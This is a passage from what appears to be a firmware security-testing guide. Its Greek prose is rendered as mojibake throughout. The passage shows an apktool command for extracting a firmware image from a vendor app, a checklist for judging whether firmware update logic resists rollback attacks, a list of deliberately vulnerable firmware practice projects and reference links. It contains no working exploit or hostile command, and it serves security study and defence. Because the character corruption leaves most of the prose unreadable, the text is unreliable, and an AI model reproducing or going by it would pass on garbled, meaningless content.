Ï…Ï€Î¿Î³ÎµÎ³ÏÎ±Î¼Î¼Î­Î½ÎµÏ‚ ÎµÎ¹ÎºÏŒÎ½ÎµÏ‚ Ï‡Ï‰ÏÎ¯Ï‚ Î½Î± Î±Î³Î³Î¯Î¾ÎµÏ„Îµ Ï„Î¿ Ï†Ï…ÏƒÎ¹ÎºÏŒ hardware.
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### Î›Î¯ÏƒÏ„Î± ÎµÎ»Î­Î³Ï‡Î¿Ï… Î³Î¹Î± Ï„Î·Î½ Î±Î¾Î¹Î¿Î»ÏŒÎ³Î·ÏƒÎ· Ï„Î·Ï‚ Î»Î¿Î³Î¹ÎºÎ®Ï‚ ÎµÎ½Î·Î¼Î­ÏÏ‰ÏƒÎ·Ï‚

* Î•Î¯Î½Î±Î¹ Î· Î¼ÎµÏ„Î±Ï†Î¿ÏÎ¬/Î±Ï…Î¸ÎµÎ½Ï„Î¹ÎºÎ¿Ï€Î¿Î¯Î·ÏƒÎ· Ï„Î¿Ï… *update endpoint* ÎµÏ€Î±ÏÎºÏÏ‚ Ï€ÏÎ¿ÏƒÏ„Î±Ï„ÎµÏ…Î¼Î­Î½Î· (TLS + authentication);
* Î£Ï…Î³ÎºÏÎ¯Î½ÎµÎ¹ Î· ÏƒÏ…ÏƒÎºÎµÏ…Î® **version numbers** Î® **monotonic anti-rollback counter** Ï€ÏÎ¹Î½ Ï„Î¿ flashing;
* Î•Ï€Î±Î»Î·Î¸ÎµÏÎµÏ„Î±Î¹ Î· image Î¼Î­ÏƒÎ± ÏƒÎµ secure boot chain (Ï€.Ï‡. signatures checked by ROM code);
* Î•ÎºÏ„ÎµÎ»ÎµÎ¯ Ï„Î¿ userland code ÎµÏ€Î¹Ï€Î»Î­Î¿Î½ ÎµÎ»Î­Î³Ï‡Î¿Ï…Ï‚ Î¿ÏÎ¸ÏŒÏ„Î·Ï„Î±Ï‚ (Ï€.Ï‡. allowed partition map, model number);
* Î•Ï€Î±Î½Î±Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î¿ÏÎ½ Î¿Î¹ ÏÎ¿Î­Ï‚ ÎµÎ½Î·Î¼Î­ÏÏ‰ÏƒÎ·Ï‚ *partial* Î® *backup* Ï„Î·Î½ Î¯Î´Î¹Î± Î»Î¿Î³Î¹ÎºÎ® ÎµÏ€Î±Î»Î®Î¸ÎµÏ…ÏƒÎ·Ï‚;

> ğŸ’¡  Î•Î¬Î½ Î¿Ï€Î¿Î¹Î¿Î´Î®Ï€Î¿Ï„Îµ Î±Ï€ÏŒ Ï„Î± Ï€Î±ÏÎ±Ï€Î¬Î½Ï‰ Î»ÎµÎ¯Ï€ÎµÎ¹, Î· Ï€Î»Î±Ï„Ï†ÏŒÏÎ¼Î± Ï€Î¹Î¸Î±Î½ÏŒÏ„Î±Ï„Î± ÎµÎ¯Î½Î±Î¹ ÎµÏ…Î¬Î»Ï‰Ï„Î· ÏƒÎµ rollback attacks.

## Î•Ï…Î¬Î»Ï‰Ï„Î¿ firmware Î³Î¹Î± ÎµÎ¾Î¬ÏƒÎºÎ·ÏƒÎ·

Î“Î¹Î± ÎµÎ¾Î¬ÏƒÎºÎ·ÏƒÎ· ÏƒÏ„Î·Î½ Î±Î½Î±ÎºÎ¬Î»Ï…ÏˆÎ· ÎµÏ…Ï€Î±Î¸ÎµÎ¹ÏÎ½ ÏƒÎµ firmware, Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÏ„Îµ Ï„Î± Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰ vulnerable firmware projects Ï‰Ï‚ ÏƒÎ·Î¼ÎµÎ¯Î¿ ÎµÎºÎºÎ¯Î½Î·ÏƒÎ·Ï‚.

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Î‘Î½Î±Ï†Î¿ÏÎ­Ï‚

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [Exploiting zero days in abandoned hardware â€“ Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)

## Î•ÎºÏ€Î±Î¯Î´ÎµÏ…ÏƒÎ· ÎºÎ±Î¹ Î Î¹ÏƒÏ„Î¿Ï€Î¿Î¹Î®ÏƒÎµÎ¹Ï‚

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

{{#include ../../banners/hacktricks-training.md}}
